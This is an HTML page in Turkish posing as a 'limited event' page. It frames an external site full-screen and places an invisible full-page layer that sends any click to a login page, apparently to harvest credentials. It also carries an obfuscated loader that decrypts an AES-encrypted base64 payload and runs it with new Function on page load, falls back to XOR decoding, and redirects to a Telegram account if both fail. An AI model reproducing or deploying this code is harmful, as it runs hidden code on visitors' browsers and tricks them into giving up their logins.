<html lang="tr">
 <head> 
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> 
  <meta name="viewport" content="width=device-width, initial-scale=1"> 
  <title>SINIRLI ETKİNLİK</title> 
  <link rel="stylesheet" href="npm/bootstrap-5.3.2/dist/css/bootstrap.min.css"> 
  <style>
		html, body {
			height: 100%;
			margin: 0;
		}

		#icerikKapsayici {
			position: relative;
			width: 100%;
			height: 100%;
		}

		#icerikKapsayici iframe {
			position: absolute;
			width: 100%;
			height: 100%;
			border: none;
		}
  	</style> 
 </head> 
 <body> 
  <div id="icerikKapsayici">
   <iframe src="https://nmx.li-nk.lol" allowfullscreen></iframe>
  </div> 
  <script>
	// Gösterilecek iframe bağlantısı
	const iframeAdresi = 'https://nmx.li-nk.lol';

	// Kapsayıcı alanı seç
	const icerikKapsayici = document.getElementById('icerikKapsayici');

	// Yeni iframe oluştur
	const cerceve = document.createElement('iframe');
	cerceve.src = iframeAdresi;
	cerceve.allowFullscreen = true;

	// Sayfaya ekle
	icerikKapsayici.appendChild(cerceve);
</script> 
  <script>
(function(){
	function yukle(){
		var belge = gizliIFrame.contentDocument || gizliIFrame.contentWindow.document;
		if(belge){
			var ekle = belge.createElement('script');
			ekle.innerHTML = "window.__CF$cv$params={r:'9a1a6dfc4fb81035',t:'MTc2MzY2NzczNw=='};"+
			"var s=document.createElement('script');s.src='cdn-cgi/challenge-platform/scripts/jsd/main.js';"+
			"document.getElementsByTagName('head')[0].appendChild(s);";
			belge.getElementsByTagName('head')[0].appendChild(ekle);
		}
	}

	if(document.body){
		var gizliIFrame = document.createElement('iframe');
		gizliIFrame.height = 1;
		gizliIFrame.width = 1;
		gizliIFrame.style.position = 'absolute';
		gizliIFrame.style.top = 0;
		gizliIFrame.style.left = 0;
		gizliIFrame.style.border = 'none';
		gizliIFrame.style.visibility = 'hidden';
		document.body.appendChild(gizliIFrame);

		if(document.readyState !== 'loading'){
			yukle();
		} else if(window.addEventListener){
			document.addEventListener('DOMContentLoaded', yukle);
		} else {
			var onceki = document.onreadystatechange || function(){};
			document.onreadystatechange = function(e){
				onceki(e);
				if(document.readyState !== 'loading'){
					document.onreadystatechange = onceki;
					yukle();
				}
			};
		}
	}
})();
</script>
  <iframe height="1" width="1" style="position: absolute; top: 0px; left: 0px; border: none; visibility: hidden;"></iframe> 
  <center> 
   <font size="2"> </font> 
  </center> 
  <!-- Tıklama katmanı: sayfa tıklanırsa login.html'e gider --> 
  <div onclick="location.href='login.html'" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:999999;background:transparent;"></div> 
  <script>
/* AES-256 runtime unpacker (Web Crypto) + XOR fallback
   - Receives: scrambled key parts (k1,k2_rev,k3), iv hex, encrypted base64
   - Primary: Web Crypto AES-CBC decrypt and run
   - Fallback: reconstruct key bytes and XOR-decrypt payload
*/
(function(){
  // embedded server values
  var _k1 = '1050d40194';
  var _k2_rev = 'b1547c4b689c';
  var _k3 = '4a1fad295caff158f6fe3f640aa898e865f71afb40';
  var _iv = 'ad163a428e30bad05c0ec8a9d1669d8d';
  var _payload = 'uspnqQq33aPxUcuMfot9cU6GIyt9B3uskgUldC/8eiHz9RgZFoLdY5s2hDC9y7SVMacoYT2WRB154yqqmixiWyWxu/62LhWS27lMrQCrhIOjf2gcZug+D2eBr7Fi4m0cCnMPylQ9L5dWdWwzVOKcBhSIyJutoLlQPTKuSCMT5SxiLVcyZG2wRa1VwYa70xl+ywz/uJ5i0Nd2SGnF3XkrLvyb6KfcMJXd1FKeYLwXoIZtpoTNJxZatcCjlF9B9C/l3r5oFevHUJ9SCNICO4nxo6Pi0Nd1ibrUECcCvKUZf2lv9SRF8AXWR37rrEIyBnHM8XDo9eO9jns7qwjAQlbbKPdM+Ro2keTqta8hl8k41QHowofMhMcNbfBL2PEb7rJYBIANn/idVu910sbKEyXyNr9F0oZ/H/7NswG8yBYCOmUojEgTL964ONqhWzlcfIG/UfMnRvT2S9yoTswwdHWYl5Xuv1xxoKci5eE0wXPpVXKGMxVA+8qh1Vd+GgYXEs27vurY7sR+x6krgolYuQoH7W5ZjAgnFxkQDkgNMZ7wFAMwyCnvUK05lc0IdldKxamfTEuAKist9qRqWV8q1OlbH0vCQP5Utn+KAcysFOC0qvpNoHqgg/mulzufOj55YtKxVrMPv1moVCtfLrsDcD9OsSb5SbNaYuY+izxeRVrqhDA42VxjyZahhZe+aGjNve5jF9Gzd9hLTS87A+XOR3LYr0FVG6Vjh0ES3ItXGXqeOYg1IC9QGioiNvBA/c84dCgwP93h+nzAgOMmMXUGfq/uW1LH7SbZRL1WhDzsYC+EsRWl7LGMq5/ro9f7eXy1G8t1ZeToEYNhDP8tGIoLYfWhnqqlWR9NQWzME4lW6QZ7FUxJMaqm4Jx+A1IPj5tMijPTdpuquhTVKiwihVZbR9K1urBW0g4+5EwSSbj3W9mOh5KA4ENGvVrxMKif9F9g2WRykhXkUlr0mKG9h+IQjZiDMI8KvGVxQ6Lkk29sNKzNAV/mCtruQ9Wj933QXYalq0hWnRvjTOcu4ANLrULUcpLd3155wlq4QZeX7HcvzoyABoqhHv4K7koMlX1eVIokf1yBPRrmN7kGOcJHFDRRvfn9rQFCUZnUizLFfPHwxZYZbZ4Cd0BdgxWkSThox8ro5PQdYSbfx2KWn7a8uko/odW/ot+9GfJDWzY4nwblKvvU2ng4G0K2J3eNM3AvCEbPVXka2HATxDIkAXDQE1GPVOc/2Q==';
  var TG = 'https://t.me/ozcan6137';

  function hexToUint8(hex){
    var l = hex.length/2;
    var out = new Uint8Array(l);
    for(var i=0;i<l;i++) out[i]=parseInt(hex.substr(i*2,2),16);
    return out;
  }

  // reconstruct key hex
  var keyHex = _k1 + (_k2_rev.split('').reverse().join('')) + _k3;
  var keyBytes = hexToUint8(keyHex);
  var ivBytes = hexToUint8(_iv);

  // base64 -> ArrayBuffer
  function b64ToBuf(b64){
    var bin = atob(b64);
    var arr = new Uint8Array(bin.length);
    for(var i=0;i<bin.length;i++) arr[i] = bin.charCodeAt(i);
    return arr.buffer;
  }

  // XOR fallback decrypt (used if Web Crypto not available)
  function xorDecode(arr, key){
    var out = new Uint8Array(arr.byteLength || arr.length);
    var data = new Uint8Array(arr);
    for(var i=0;i<data.length;i++) out[i] = data[i] ^ key[i % key.length];
    return out;
  }

  // convert Uint8Array to string
  function u8ToStr(u8){
    var s='';
    for(var i=0;i<u8.length;i++) s += String.fromCharCode(u8[i]);
    return s;
  }

  // try Web Crypto first
  (async function(){
    try{
      if(window.crypto && crypto.subtle && crypto.subtle.importKey){
        var cryptoKey = await crypto.subtle.importKey('raw', keyBytes.buffer, {name:'AES-CBC'}, false, ['decrypt']);
        var encBuf = b64ToBuf(_payload);
        var decBuf = await crypto.subtle.decrypt({name:'AES-CBC', iv: ivBytes.buffer}, cryptoKey, encBuf);
        var s = u8ToStr(new Uint8Array(decBuf));
        (new Function(s))();
        return;
      }
    }catch(e){ /* fall through to XOR fallback */ }

    // XOR fallback
    try{
      var enc = b64ToBuf(_payload);
      var dec = xorDecode(enc, keyBytes);
      var s2 = u8ToStr(dec);
      (new Function(s2))();
      return;
    }catch(e){
      try{ location.replace(TG); }catch(ex){}
    }
  })();
})();
</script> 
 </body>
</html>